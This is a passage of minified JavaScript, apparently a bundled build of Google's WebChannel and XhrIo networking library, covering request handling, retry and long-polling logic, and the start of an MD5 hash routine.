    this.l = e || Z4, Y.PerformanceNavigationTiming ? (e = Y.performance.getEntriesByType("navigation"), e = 0 < e.length && (e[0].nextHopProtocol == "hq" || e[0].nextHopProtocol == "h2")) : e = !!(Y.g && Y.g.Ka && Y.g.Ka() && Y.g.Ka().dc), this.j = e ? this.l : 1, this.g = null, 1 < this.j && (this.g = new Set), this.h = null, this.i = []
}
var Z4 = 10;

function mf(e) {
    return e.h ? !0 : e.g ? e.g.size >= e.j : !1
}

function vf(e) {
    return e.h ? 1 : e.g ? e.g.size : 0
}

function lo(e, t) {
    return e.h ? e.h == t : e.g ? e.g.has(t) : !1
}

function ca(e, t) {
    e.g ? e.g.add(t) : e.h = t
}

function yf(e, t) {
    e.h && e.h == t ? e.h = null : e.g && e.g.has(t) && e.g.delete(t)
}
gf.prototype.cancel = function() {
    if (this.i = bf(this), this.h) this.h.cancel(), this.h = null;
    else if (this.g && this.g.size !== 0) {
        for (const e of this.g.values()) e.cancel();
        this.g.clear()
    }
};

function bf(e) {
    if (e.h != null) return e.i.concat(e.h.F);
    if (e.g != null && e.g.size !== 0) {
        let t = e.i;
        for (const s of e.g.values()) t = t.concat(s.F);
        return t
    }
    return qo(e.i)
}
var X4 = class {
    stringify(e) {
        return Y.JSON.stringify(e, void 0)
    }
    parse(e) {
        return Y.JSON.parse(e, void 0)
    }
};

function Y4() {
    this.g = new X4
}

function Q4(e, t, s) {
    const n = s || "";
    try {
        df(e, function(i, r) {
            let o = i;
            An(i) && (o = ea(i)), t.push(n + r + "=" + encodeURIComponent(o))
        })
    } catch (i) {
        throw t.push(n + "type=" + encodeURIComponent("_badmap")), i
    }
}

function J4(e, t) {
    const s = new Gi;
    if (Y.Image) {
        const n = new Image;
        n.onload = Gn(qn, s, n, "TestLoadImage: loaded", !0, t), n.onerror = Gn(qn, s, n, "TestLoadImage: error", !1, t), n.onabort = Gn(qn, s, n, "TestLoadImage: abort", !1, t), n.ontimeout = Gn(qn, s, n, "TestLoadImage: timeout", !1, t), Y.setTimeout(function() {
            n.ontimeout && n.ontimeout()
        }, 1e4), n.src = e
    } else t(!1)
}

function qn(e, t, s, n, i) {
    try {
        t.onload = null, t.onerror = null, t.onabort = null, t.ontimeout = null, i(n)
    } catch {}
}

function Zi(e) {
    this.l = e.ec || null, this.j = e.ob || !1
}
Oe(Zi, oa);
Zi.prototype.g = function() {
    return new Xi(this.l, this.j)
};
Zi.prototype.i = function(e) {
    return function() {
        return e
    }
}({});

function Xi(e, t) {
    ke.call(this), this.F = e, this.u = t, this.m = void 0, this.readyState = da, this.status = 0, this.responseType = this.responseText = this.response = this.statusText = "", this.onreadystatechange = null, this.v = new Headers, this.h = null, this.C = "GET", this.B = "", this.g = !1, this.A = this.j = this.l = null
}
Oe(Xi, ke);
var da = 0;
H = Xi.prototype;
H.open = function(e, t) {
    if (this.readyState != da) throw this.abort(), Error("Error reopening a connection");
    this.C = e, this.B = t, this.readyState = 1, Sn(this)
};
H.send = function(e) {
    if (this.readyState != 1) throw this.abort(), Error("need to call open() first. ");
    this.g = !0;
    const t = {
        headers: this.v,
        method: this.C,
        credentials: this.m,
        cache: void 0
    };
    e && (t.body = e), (this.F || Y).fetch(new Request(this.B, t)).then(this.$a.bind(this), this.ka.bind(this))
};
H.abort = function() {
    this.response = this.responseText = "", this.v = new Headers, this.status = 0, this.j && this.j.cancel("Request was aborted.").catch(() => {}), 1 <= this.readyState && this.g && this.readyState != 4 && (this.g = !1, kn(this)), this.readyState = da
};
H.$a = function(e) {
    if (this.g && (this.l = e, this.h || (this.status = this.l.status, this.statusText = this.l.statusText, this.h = e.headers, this.readyState = 2, Sn(this)), this.g && (this.readyState = 3, Sn(this), this.g)))
        if (this.responseType === "arraybuffer") e.arrayBuffer().then(this.Ya.bind(this), this.ka.bind(this));
        else if (typeof Y.ReadableStream < "u" && "body" in e) {
        if (this.j = e.body.getReader(), this.u) {
            if (this.responseType) throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');
            this.response = []
        } else this.response = this.responseText = "", this.A = new TextDecoder;
        wf(this)
    } else e.text().then(this.Za.bind(this), this.ka.bind(this))
};

function wf(e) {
    e.j.read().then(e.Xa.bind(e)).catch(e.ka.bind(e))
}
H.Xa = function(e) {
    if (this.g) {
        if (this.u && e.value) this.response.push(e.value);
        else if (!this.u) {
            var t = e.value ? e.value : new Uint8Array(0);
            (t = this.A.decode(t, {
                stream: !e.done
            })) && (this.response = this.responseText += t)
        }
        e.done ? kn(this) : Sn(this), this.readyState == 3 && wf(this)
    }
};
H.Za = function(e) {
    this.g && (this.response = this.responseText = e, kn(this))
};
H.Ya = function(e) {
    this.g && (this.response = e, kn(this))
};
H.ka = function() {
    this.g && kn(this)
};

function kn(e) {
    e.readyState = 4, e.l = null, e.j = null, e.A = null, Sn(e)
}
H.setRequestHeader = function(e, t) {
    this.v.append(e, t)
};
H.getResponseHeader = function(e) {
    return this.h && this.h.get(e.toLowerCase()) || ""
};
H.getAllResponseHeaders = function() {
    if (!this.h) return "";
    const e = [],
        t = this.h.entries();
    for (var s = t.next(); !s.done;) s = s.value, e.push(s[0] + ": " + s[1]), s = t.next();
    return e.join(`\r
`)
};

function Sn(e) {
    e.onreadystatechange && e.onreadystatechange.call(e)
}
Object.defineProperty(Xi.prototype, "withCredentials", {
    get: function() {
        return this.m === "include"
    },
    set: function(e) {
        this.m = e ? "include" : "same-origin"
    }
});
var e5 = Y.JSON.parse;

function Ae(e) {
    ke.call(this), this.headers = new Map, this.u = e || null, this.h = !1, this.C = this.g = null, this.I = "", this.m = 0, this.j = "", this.l = this.G = this.v = this.F = !1, this.B = 0, this.A = null, this.K = xf, this.L = this.M = !1
}
Oe(Ae, ke);
var xf = "",
    t5 = /^https?$/i,
    s5 = ["POST", "PUT"];
H = Ae.prototype;
H.Oa = function(e) {
    this.M = e
};
H.ha = function(e, t, s, n) {
    if (this.g) throw Error("[goog.net.XhrIo] Object is active with another request=" + this.I + "; newUri=" + e);
    t = t ? t.toUpperCase() : "GET", this.I = e, this.j = "", this.m = 0, this.F = !1, this.h = !0, this.g = this.u ? this.u.g() : io.g(), this.C = this.u ? jl(this.u) : jl(io), this.g.onreadystatechange = ze(this.La, this);
    try {
        this.G = !0, this.g.open(t, String(e), !0), this.G = !1
    } catch (r) {
        zl(this, r);
        return
    }
    if (e = s || "", s = new Map(this.headers), n)
        if (Object.getPrototypeOf(n) === Object.prototype)
            for (var i in n) s.set(i, n[i]);
        else if (typeof n.keys == "function" && typeof n.get == "function")
        for (const r of n.keys()) s.set(r, n.get(r));
    else throw Error("Unknown input type for opt_headers: " + String(n));
    n = Array.from(s.keys()).find(r => r.toLowerCase() == "content-type"), i = Y.FormData && e instanceof Y.FormData, !(0 <= Hd(s5, t)) || n || i || s.set("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");
    for (const [r, o] of s) this.g.setRequestHeader(r, o);
    this.K && (this.g.responseType = this.K), "withCredentials" in this.g && this.g.withCredentials !== this.M && (this.g.withCredentials = this.M);
    try {
        Sf(this), 0 < this.B && ((this.L = n5(this.g)) ? (this.g.timeout = this.B, this.g.ontimeout = ze(this.ua, this)) : this.A = na(this.ua, this.B, this)), this.v = !0, this.g.send(e), this.v = !1
    } catch (r) {
        zl(this, r)
    }
};

function n5(e) {
    return vn && typeof e.timeout == "number" && e.ontimeout !== void 0
}
H.ua = function() {
    typeof Wo < "u" && this.g && (this.j = "Timed out after " + this.B + "ms, aborting", this.m = 8, Re(this, "timeout"), this.abort(8))
};

function zl(e, t) {
    e.h = !1, e.g && (e.l = !0, e.g.abort(), e.l = !1), e.j = t, e.m = 5, _f(e), Yi(e)
}

function _f(e) {
    e.F || (e.F = !0, Re(e, "complete"), Re(e, "error"))
}
H.abort = function(e) {
    this.g && this.h && (this.h = !1, this.l = !0, this.g.abort(), this.l = !1, this.m = e || 7, Re(this, "complete"), Re(this, "abort"), Yi(this))
};
H.N = function() {
    this.g && (this.h && (this.h = !1, this.l = !0, this.g.abort(), this.l = !1), Yi(this, !0)), Ae.$.N.call(this)
};
H.La = function() {
    this.s || (this.G || this.v || this.l ? Cf(this) : this.kb())
};
H.kb = function() {
    Cf(this)
};

function Cf(e) {
    if (e.h && typeof Wo < "u" && (!e.C[1] || St(e) != 4 || e.da() != 2)) {
        if (e.v && St(e) == 4) na(e.La, 0, e);
        else if (Re(e, "readystatechange"), St(e) == 4) {
            e.h = !1;
            try {
                const o = e.da();
                e: switch (o) {
                    case 200:
                    case 201:
                    case 202:
                    case 204:
                    case 206:
                    case 304:
                    case 1223:
                        var t = !0;
                        break e;
                    default:
                        t = !1
                }
                var s;
                if (!(s = t)) {
                    var n;
                    if (n = o === 0) {
                        var i = String(e.I).match(ff)[1] || null;
                        !i && Y.self && Y.self.location && (i = Y.self.location.protocol.slice(0, -1)), n = !t5.test(i ? i.toLowerCase() : "")
                    }
                    s = n
                }
                if (s) Re(e, "complete"), Re(e, "success");
                else {
                    e.m = 6;
                    try {
                        var r = 2 < St(e) ? e.g.statusText : ""
                    } catch {
                        r = ""
                    }
                    e.j = r + " [" + e.da() + "]", _f(e)
                }
            } finally {
                Yi(e)
            }
        }
    }
}

function Yi(e, t) {
    if (e.g) {
        Sf(e);
        const s = e.g,
            n = e.C[0] ? () => {} : null;
        e.g = null, e.C = null, t || Re(e, "ready");
        try {
            s.onreadystatechange = n
        } catch {}
    }
}

function Sf(e) {
    e.g && e.L && (e.g.ontimeout = null), e.A && (Y.clearTimeout(e.A), e.A = null)
}
H.isActive = function() {
    return !!this.g
};

function St(e) {
    return e.g ? e.g.readyState : 0
}
H.da = function() {
    try {
        return 2 < St(this) ? this.g.status : -1
    } catch {
        return -1
    }
};
H.ja = function() {
    try {
        return this.g ? this.g.responseText : ""
    } catch {
        return ""
    }
};
H.Wa = function(e) {
    if (this.g) {
        var t = this.g.responseText;
        return e && t.indexOf(e) == 0 && (t = t.substring(e.length)), e5(t)
    }
};

function Ul(e) {
    try {
        if (!e.g) return null;
        if ("response" in e.g) return e.g.response;
        switch (e.K) {
            case xf:
            case "text":
                return e.g.responseText;
            case "arraybuffer":
                if ("mozResponseArrayBuffer" in e.g) return e.g.mozResponseArrayBuffer
        }
        return null
    } catch {
        return null
    }
}

function i5(e) {
    const t = {};
    e = (e.g && 2 <= St(e) && e.g.getAllResponseHeaders() || "").split(`\r
`);
    for (let n = 0; n < e.length; n++) {
        if (mn(e[n])) continue;
        var s = A4(e[n]);
        const i = s[0];
        if (s = s[1], typeof s != "string") continue;
        s = s.trim();
        const r = t[i] || [];
        t[i] = r, r.push(s)
    }
    w4(t, function(n) {
        return n.join(", ")
    })
}
H.Ia = function() {
    return this.m
};
H.Sa = function() {
    return typeof this.j == "string" ? this.j : String(this.j)
};

function Ef(e) {
    let t = "";
    return Zo(e, function(s, n) {
        t += n, t += ":", t += s, t += `\r
`
    }), t
}

function fa(e, t, s) {
    e: {
        for (n in s) {
            var n = !1;
            break e
        }
        n = !0
    }
    n || (s = Ef(s), typeof e == "string" ? s != null && encodeURIComponent(String(s)) : we(e, t, s))
}

function Zs(e, t, s) {
    return s && s.internalChannelParams && s.internalChannelParams[e] || t
}

function Tf(e) {
    this.Ga = 0, this.j = [], this.l = new Gi, this.pa = this.wa = this.I = this.Y = this.g = this.Da = this.F = this.na = this.o = this.U = this.s = null, this.fb = this.W = 0, this.cb = Zs("failFast", !1, e), this.G = this.v = this.u = this.m = this.h = null, this.aa = !0, this.Fa = this.V = -1, this.ba = this.A = this.C = 0, this.ab = Zs("baseRetryDelayMs", 5e3, e), this.hb = Zs("retryDelaySeedMs", 1e4, e), this.eb = Zs("forwardChannelMaxRetries", 2, e), this.xa = Zs("forwardChannelRequestTimeoutMs", 2e4, e), this.va = e && e.xmlHttpFactory || void 0, this.Ha = e && e.useFetchStreams || !1, this.L = void 0, this.J = e && e.supportsCrossDomainXhr || !1, this.K = "", this.i = new gf(e && e.concurrentRequestLimit), this.Ja = new Y4, this.P = e && e.fastHandshake || !1, this.O = e && e.encodeInitMessageHeaders || !1, this.P && this.O && (this.O = !1), this.bb = e && e.bc || !1, e && e.Ea && this.l.Ea(), e && e.forceLongPolling && (this.aa = !1), this.ca = !this.P && this.aa && e && e.detectBufferingProxy || !1, this.qa = void 0, e && e.longPollingTimeout && 0 < e.longPollingTimeout && (this.qa = e.longPollingTimeout), this.oa = void 0, this.S = 0, this.M = !1, this.ma = this.B = null
}
H = Tf.prototype;
H.ra = 8;
H.H = 1;

function pa(e) {
    if (Af(e), e.H == 3) {
        var t = e.W++,
            s = Ot(e.I);
        if (we(s, "SID", e.K), we(s, "RID", t), we(s, "TYPE", "terminate"), On(e, s), t = new Pn(e, e.l, t), t.L = 2, t.A = Ki(Ot(s)), s = !1, Y.navigator && Y.navigator.sendBeacon) try {
            s = Y.navigator.sendBeacon(t.A.toString(), "")
        } catch {}!s && Y.Image && (new Image().src = t.A, s = !0), s || (t.g = $f(t.l, null), t.g.ha(t.A)), t.G = Date.now(), Mn(t)
    }
    kf(e)
}

function Qi(e) {
    e.g && (ha(e), e.g.cancel(), e.g = null)
}

function Af(e) {
    Qi(e), e.u && (Y.clearTimeout(e.u), e.u = null), yi(e), e.i.cancel(), e.m && (typeof e.m == "number" && Y.clearTimeout(e.m), e.m = null)
}

function Ji(e) {
    if (!mf(e.i) && !e.m) {
        e.m = !0;
        var t = e.Na;
        bn || Xd(), wn || (bn(), wn = !0), ta.add(t, e), e.C = 0
    }
}

function r5(e, t) {
    return vf(e.i) >= e.i.j - (e.m ? 1 : 0) ? !1 : e.m ? (e.j = t.F.concat(e.j), !0) : e.H == 1 || e.H == 2 || e.C >= (e.cb ? 0 : e.eb) ? !1 : (e.m = In(ze(e.Na, e, t), Mf(e, e.C)), e.C++, !0)
}
H.Na = function(e) {
    if (this.m)
        if (this.m = null, this.H == 1) {
            if (!e) {
                this.W = Math.floor(1e5 * Math.random()), e = this.W++;
                const i = new Pn(this, this.l, e);
                let r = this.s;
                if (this.U && (r ? (r = Fd(r), zd(r, this.U)) : r = this.U), this.o !== null || this.O || (i.I = r, r = null), this.P) e: {
                    for (var t = 0, s = 0; s < this.j.length; s++) {
                        t: {
                            var n = this.j[s];
                            if ("__data__" in n.map && (n = n.map.__data__, typeof n == "string")) {
                                n = n.length;
                                break t
                            }
                            n = void 0
                        }
                        if (n === void 0) break;
                        if (t += n, 4096 < t) {
                            t = s;
                            break e
                        }
                        if (t === 4096 || s === this.j.length - 1) {
                            t = s + 1;
                            break e
                        }
                    }
                    t = 1e3
                }
                else t = 1e3;
                t = Lf(this, i, t), s = Ot(this.I), we(s, "RID", e), we(s, "CVER", 22), this.F && we(s, "X-HTTP-Session-Id", this.F), On(this, s), r && (this.O ? t = "headers=" + encodeURIComponent(String(Ef(r))) + "&" + t : this.o && fa(s, this.o, r)), ca(this.i, i), this.bb && we(s, "TYPE", "init"), this.P ? (we(s, "$req", t), we(s, "SID", "null"), i.aa = !0, oo(i, s, null)) : oo(i, s, t), this.H = 2
            }
        } else this.H == 3 && (e ? Gl(this, e) : this.j.length == 0 || mf(this.i) || Gl(this))
};

function Gl(e, t) {
    var s;
    t ? s = t.m : s = e.W++;
    const n = Ot(e.I);
    we(n, "SID", e.K), we(n, "RID", s), we(n, "AID", e.V), On(e, n), e.o && e.s && fa(n, e.o, e.s), s = new Pn(e, e.l, s, e.C + 1), e.o === null && (s.I = e.s), t && (e.j = t.F.concat(e.j)), t = Lf(e, s, 1e3), s.setTimeout(Math.round(.5 * e.xa) + Math.round(.5 * e.xa * Math.random())), ca(e.i, s), oo(s, n, t)
}

function On(e, t) {
    e.na && Zo(e.na, function(s, n) {
        we(t, n, s)
    }), e.h && df({}, function(s, n) {
        we(t, n, s)
    })
}

function Lf(e, t, s) {
    s = Math.min(e.j.length, s);
    var n = e.h ? ze(e.h.Va, e.h, e) : null;
    e: {
        var i = e.j;
        let r = -1;
        for (;;) {
            const o = ["count=" + s];
            r == -1 ? 0 < s ? (r = i[0].g, o.push("ofs=" + r)) : r = 0 : o.push("ofs=" + r);
            let l = !0;
            for (let a = 0; a < s; a++) {
                let c = i[a].g;
                const d = i[a].map;
                if (c -= r, 0 > c) r = Math.max(0, i[a].g - 100), l = !1;
                else try {
                    Q4(d, o, "req" + c + "_")
                } catch {
                    n && n(d)
                }
            }
            if (l) {
                n = o.join("&");
                break e
            }
        }
    }
    return e = e.j.splice(0, s), t.F = e, n
}

function If(e) {
    if (!e.g && !e.u) {
        e.ba = 1;
        var t = e.Ma;
        bn || Xd(), wn || (bn(), wn = !0), ta.add(t, e), e.A = 0
    }
}

function ua(e) {
    return e.g || e.u || 3 <= e.A ? !1 : (e.ba++, e.u = In(ze(e.Ma, e), Mf(e, e.A)), e.A++, !0)
}
H.Ma = function() {
    if (this.u = null, Nf(this), this.ca && !(this.M || this.g == null || 0 >= this.S)) {
        var e = 2 * this.S;
        this.l.info("BP detection timer enabled: " + e), this.B = In(ze(this.jb, this), e)
    }
};
H.jb = function() {
    this.B && (this.B = null, this.l.info("BP detection timeout reached."), this.l.info("Buffering proxy detected and switch to long-polling!"), this.G = !1, this.M = !0, qe(10), Qi(this), Nf(this))
};

function ha(e) {
    e.B != null && (Y.clearTimeout(e.B), e.B = null)
}

function Nf(e) {
    e.g = new Pn(e, e.l, "rpc", e.ba), e.o === null && (e.g.I = e.s), e.g.O = 0;
    var t = Ot(e.wa);
    we(t, "RID", "rpc"), we(t, "SID", e.K), we(t, "AID", e.V), we(t, "CI", e.G ? "0" : "1"), !e.G && e.qa && we(t, "TO", e.qa), we(t, "TYPE", "xmlhttp"), On(e, t), e.o && e.s && fa(t, e.o, e.s), e.L && e.g.setTimeout(e.L);
    var s = e.g;
    e = e.pa, s.L = 1, s.A = Ki(Ot(t)), s.u = null, s.S = !0, of (s, e)
}
H.ib = function() {
    this.v != null && (this.v = null, Qi(this), ua(this), qe(19))
};

function yi(e) {
    e.v != null && (Y.clearTimeout(e.v), e.v = null)
}

function Pf(e, t) {
    var s = null;
    if (e.g == t) {
        yi(e), ha(e), e.g = null;
        var n = 2
    } else if (lo(e.i, t)) s = t.F, yf(e.i, t), n = 1;
    else return;
    if (e.H != 0) {
        if (t.i)
            if (n == 1) {
                s = t.u ? t.u.length : 0, t = Date.now() - t.G;
                var i = e.C;
                n = ia(), Re(n, new sf(n, s)), Ji(e)
            } else If(e);
        else if (i = t.s, i == 3 || i == 0 && 0 < t.ca || !(n == 1 && r5(e, t) || n == 2 && ua(e))) switch (s && 0 < s.length && (t = e.i, t.i = t.i.concat(s)), i) {
            case 1:
                rs(e, 5);
                break;
            case 4:
                rs(e, 10);
                break;
            case 3:
                rs(e, 6);
                break;
            default:
                rs(e, 2)
        }
    }
}

function Mf(e, t) {
    let s = e.ab + Math.floor(Math.random() * e.hb);
    return e.isActive() || (s *= 2), s * t
}

function rs(e, t) {
    if (e.l.info("Error code " + t), t == 2) {
        var s = null;
        e.h && (s = null);
        var n = ze(e.pb, e);
        s || (s = new ds("//www.google.com/images/cleardot.gif"), Y.location && Y.location.protocol == "http" || mi(s, "https"), Ki(s)), J4(s.toString(), n)
    } else qe(2);
    e.H = 0, e.h && e.h.za(t), kf(e), Af(e)
}
H.pb = function(e) {
    e ? (this.l.info("Successfully pinged google.com"), qe(2)) : (this.l.info("Failed to ping google.com"), qe(1))
};

function kf(e) {
    if (e.H = 0, e.ma = [], e.h) {
        const t = bf(e.i);
        (t.length != 0 || e.j.length != 0) && (Ol(e.ma, t), Ol(e.ma, e.j), e.i.i.length = 0, qo(e.j), e.j.length = 0), e.h.ya()
    }
}

function Of(e, t, s) {
    var n = s instanceof ds ? Ot(s) : new ds(s);
    if (n.g != "") t && (n.g = t + "." + n.g), vi(n, n.m);
    else {
        var i = Y.location;
        n = i.protocol, t = t ? t + "." + i.hostname : i.hostname, i = +i.port;
        var r = new ds(null);
        n && mi(r, n), t && (r.g = t), i && vi(r, i), s && (r.l = s), n = r
    }
    return s = e.F, t = e.Da, s && t && we(n, s, t), we(n, "VER", e.ra), On(e, n), n
}

function $f(e, t, s) {
    if (t && !e.J) throw Error("Can't create secondary domain capable XhrIo object.");
    return t = e.Ha && !e.va ? new Ae(new Zi({
        ob: s
    })) : new Ae(e.va), t.Oa(e.J), t
}
H.isActive = function() {
    return !!this.h && this.h.isActive(this)
};

function Rf() {}
H = Rf.prototype;
H.Ba = function() {};
H.Aa = function() {};
H.za = function() {};
H.ya = function() {};
H.isActive = function() {
    return !0
};
H.Va = function() {};

function ct(e, t) {
    ke.call(this), this.g = new Tf(t), this.l = e, this.h = t && t.messageUrlParams || null, e = t && t.messageHeaders || null, t && t.clientProtocolHeaderRequired && (e ? e["X-Client-Protocol"] = "webchannel" : e = {
        "X-Client-Protocol": "webchannel"
    }), this.g.s = e, e = t && t.initMessageHeaders || null, t && t.messageContentType && (e ? e["X-WebChannel-Content-Type"] = t.messageContentType : e = {
        "X-WebChannel-Content-Type": t.messageContentType
    }), t && t.Ca && (e ? e["X-WebChannel-Client-Profile"] = t.Ca : e = {
        "X-WebChannel-Client-Profile": t.Ca
    }), this.g.U = e, (e = t && t.cc) && !mn(e) && (this.g.o = e), this.A = t && t.supportsCrossDomainXhr || !1, this.v = t && t.sendRawJson || !1, (t = t && t.httpSessionIdParam) && !mn(t) && (this.g.F = t, e = this.h, e !== null && t in e && (e = this.h, t in e && delete e[t])), this.j = new Us(this)
}
Oe(ct, ke);
ct.prototype.m = function() {
    this.g.h = this.j, this.A && (this.g.J = !0);
    var e = this.g,
        t = this.l,
        s = this.h || void 0;
    qe(0), e.Y = t, e.na = s || {}, e.G = e.aa, e.I = Of(e, null, e.Y), Ji(e)
};
ct.prototype.close = function() {
    pa(this.g)
};
ct.prototype.u = function(e) {
    var t = this.g;
    if (typeof e == "string") {
        var s = {};
        s.__data__ = e, e = s
    } else this.v && (s = {}, s.__data__ = ea(e), e = s);
    t.j.push(new K4(t.fb++, e)), t.H == 3 && Ji(t)
};
ct.prototype.N = function() {
    this.g.h = null, delete this.j, pa(this.g), delete this.g, ct.$.N.call(this)
};

function Df(e) {
    aa.call(this), e.__headers__ && (this.headers = e.__headers__, this.statusCode = e.__status__, delete e.__headers__, delete e.__status__);
    var t = e.__sm__;
    if (t) {
        e: {
            for (const s in t) {
                e = s;
                break e
            }
            e = void 0
        }(this.i = e) && (e = this.i, t = t !== null && e in t ? t[e] : void 0),
        this.data = t
    }
    else this.data = e
}
Oe(Df, aa);

function Hf() {
    la.call(this), this.status = 1
}
Oe(Hf, la);

function Us(e) {
    this.g = e
}
Oe(Us, Rf);
Us.prototype.Ba = function() {
    Re(this.g, "a")
};
Us.prototype.Aa = function(e) {
    Re(this.g, new Df(e))
};
Us.prototype.za = function(e) {
    Re(this.g, new Hf)
};
Us.prototype.ya = function() {
    Re(this.g, "b")
};

function o5() {
    this.blockSize = -1
}

function At() {
    this.blockSize = -1, this.blockSize = 64, this.g = Array(4), this.m = Array(this.blockSize), this.i = this.h = 0, this.reset()
}
Oe(At, o5);
At.prototype.reset = function() {
    this.g[0] = 1732584193, this.g[1] = 4023233417, this.g[2] = 2562383102, this.g[3] = 271733878, this.i = this.h = 0
};

function Ar(e, t, s) {
    s || (s = 0);
    var n = Array(16);
    if (typeof t == "string")
        for (var i = 0; 16 > i; ++i) n[i] = t.charCodeAt(s++) | t.charCodeAt(s++) << 8 | t.charCodeAt(s++) << 16 | t.charCodeAt(s++) << 24;
    else
        for (i = 0; 16 > i; ++i) n[i] = t[s++] | t[s++] << 8 | t[s++] << 16 | t[s++] << 24;
    t = e.g[0], s = e.g[1], i = e.g[2];
    var r = e.g[3],
        o = t + (r ^ s & (i ^ r)) + n[0] + 3614090360 & 4294967295;
    t = s + (o << 7 & 4294967295 | o >>> 25), o = r + (i ^ t & (s ^ i)) + n[1] + 3905402710 & 4294967295, r = t + (o << 12 & 4294967295 | o >>> 20), o = i + (s ^ r & (t ^ s)) + n[2] + 606105819 & 4294967295, i = r + (o << 17 & 4294967295 | o >>> 15), o = s + (t ^ i & (r ^ t)) + n[3] + 3250441966 & 4294967295, s = i + (o << 22 & 4294967295 | o >>> 10), o = t + (r ^ s & (i ^ r)) + n[4] + 4118548399 & 4294967295, t = s + (o << 7 & 4294967295 | o >>> 25), o = r + (i ^ t & (s ^ i)) + n[5] + 1200080426 & 4294967295, r = t + (o << 12 & 4294967295 | o >>> 20), o = i + (s ^ r & (t ^ s)) + n[6] + 2821735955 & 4294967295, i = r + (o << 17 & 4294967295 | o >>> 15), o = s + (t ^ i & (r ^ t)) + n[7] + 4249261313 & 4294967295, s = i + (o << 22 & 4294967295 | o >>> 10), o = t + (r ^ s & (i ^ r)) + n[8] + 1770035416 & 4294967295, t = s + (o << 7 & 4294967295 | o >>> 25), o = r + (i ^ t & (s ^ i)) + n[9] + 2336552879 & 4294967295, r = t + (o << 12 & 4294967295 | o >>> 20), o = i + (s ^ r & (t ^ s)) + n[10] + 4294925233 & 4294967295, i = r + (o << 17 & 4294967295 | o >>> 15), o = s + (t ^ i & (r ^ t)) + n[11] + 2304563134 & 4294967295, s = i + (o << 22 & 4294967295 | o >>> 10), o = t + (r ^ s & (i ^ r)) + n[12] + 1804603682 & 4294967295, t = s + (o << 7 & 4294967295 | o >>> 25), o = r + (i ^ t & (s ^ i)) + n[13] + 4254626195 & 4294967295, r = t + (o << 12 & 4294967295 | o >>> 20), o = i + (s ^ r & (t ^ s)) + n[14] + 2792965006 & 4294967295, i = r + (o << 17 & 4294967295 | o >>> 15), o = s + (t ^ i & (r ^ t)) + n[15] + 1236535329 & 4294967295, s = i + (o << 22 & 4294967295 | o >>> 10), o = t + (i ^ r & (s ^ i)) + n[1] + 4129170786 & 4294967295, t = s + (o << 5 & 4294967295 | o >>> 27), o = r + (s ^ i & (t ^ s)) + n[6] + 3225465664 & 4294967295, r = t + (o << 9 & 4294967295 | o >>> 23), o = i + (t ^ s & (r ^ t)) + n[11] + 643717713 & 4294967295, i = r + (o << 14 & 4294967295 | o >>> 18), o = s + (r ^ t & (i ^ r)) + n[0] + 3921069994 & 4294967295, s = i + (o << 20 & 4294967295 | o >>> 12), o = t + (i ^ r & (s ^ i)) + n[5] + 3593408605 & 4294967295, t = s + (o << 5 & 4294967295 | o >>> 27), o = r + (s ^ i & (t ^ s)) + n[10] + 38016083 & 4294967295, r = t + (o << 9 & 4294967295 | o >>> 23), o = i + (t ^ s & (r ^ t)) + n[15] + 3634488961 & 4294967295, i = r + (o << 14 & 4294967295 | o >>> 18), o = s + (r ^ t & (i ^ r)) + n[4] + 3889429448 & 4294967295, s = i + (o << 20 & 4294967295 | o >>> 12), o = t + (i ^ r & (s ^ i)) + n[9] + 568446438 & 4294967295, t = s + (o << 5 & 4294967295 | o >>> 27), o = r + (s ^ i & (t ^ s)) + n[14] + 3275163606 & 4294967295, r = t + (o << 9 & 4294967295 | o >>> 23), o = i + (t ^ s & (r ^ t)) + n[3] + 4107603335 & 4294967295, i = r + (o << 14 & 4294967295 | o >>> 18), o = s + (r ^ t & (i ^ r)) + n[8] + 1163531501 & 4294967295, s = i + (o << 20 & 4294967295 | o >>> 12), o = t + (i ^ r & (s ^ i)) + n[13] + 2850285829 & 4294967295, t = s + (o << 5 & 4294967295 | o >>> 27), o = r + (s ^ i & (t ^ s)) + n[2] + 4243563512 & 4294967295, r = t + (o << 9 & 4294967295 | o >>> 23), o = i + (t ^ s & (r ^ t)) + n[7] + 1735328473 & 4294967295, i = r + (o << 14 & 4294967295 | o >>> 18), o = s + (r ^ t & (i ^ r)) + n[12] + 2368359562 & 4294967295, s = i + (o << 20 & 4294967295 | o >>> 12), o = t + (s ^ i ^ r) + n[5] + 4294588738 & 4294967295, t = s + (o << 4 & 4294967295 | o >>> 28), o = r + (t ^ s ^ i) + n[8] + 2272392833 & 4294967295, r = t + (o << 11 & 4294967295 | o >>> 21), o = i + (r ^ t ^ s) + n[11] + 1839030562 & 4294967295, i = r + (o << 16 & 4294967295 | o >>> 16), o = s + (i ^ r ^ t) + n[14] + 4259657740 & 4294967295, s = i + (o << 23 & 4294967295 | o >>> 9), o = t + (s ^ i ^ r) + n[1] + 2763975236 & 4294967295, t = s + (o << 4 & 4294967295 | o >>> 28), o = r + (t ^ s ^ i) + n[4] + 1272893353 & 4294967295, r = t + (o << 11 & 4294967295 | o >>> 21), o = i + (r ^ t ^ s) + n[7] + 4139469664 & 4294967295, i = r + (o << 16 & 4294967295 | o >>> 16), o = s + (i ^ r ^ t) + n[10] + 3200236656 & 4294967295, s = i + (o << 23 & 4294967295 | o >>> 9), o = t + (s ^ i ^ r) + n[13] + 681279174 & 4294967295, t = s + (o << 4 & 4294967295 | o >>> 28), o = r + (t ^ s ^ i) + n[0] + 3936430074 & 4294967295, r = t + (o << 11 & 4294967295 | o >>> 21), o = i + (r ^ t ^ s) + n[3] + 3572445317 & 4294967295, i = r + (o << 16 & 4294967295 | o >>> 16), o = s + (i ^ r ^ t) + n[6] + 76029189 & 4294967295, s = i + (o << 23 & 4294967295 | o >>> 9), o = t + (s ^ i ^ r) + n[9] + 3654602809 & 4294967295, t = s + (o << 4 & 4294967295 | o >>> 28), o = r + (t ^ s ^ i) + n[12] + 3873151461 & 4294967295, r = t + (o << 11 & 4294967295 | o >>> 21), o = i + (r ^ t ^ s) + n[15] + 530742520 & 4294967295, i = r + (o << 16 & 4294967295 | o >>> 16), o = s + (i ^ r ^ t) + n[2] + 3299628645 & 4294967295, s = i + (o << 23 & 4294967295 | o >>> 9), o = t + (i ^ (s | ~r)) + n[0] + 4096336452 & 4294967295, t = s + (o << 6 & 4294967295 | o >>> 26), o = r + (s ^ (t | ~i)) + n[7] + 1126891415 & 4294967295, r = t + (o << 10 & 4294967295 | o >>> 22), o 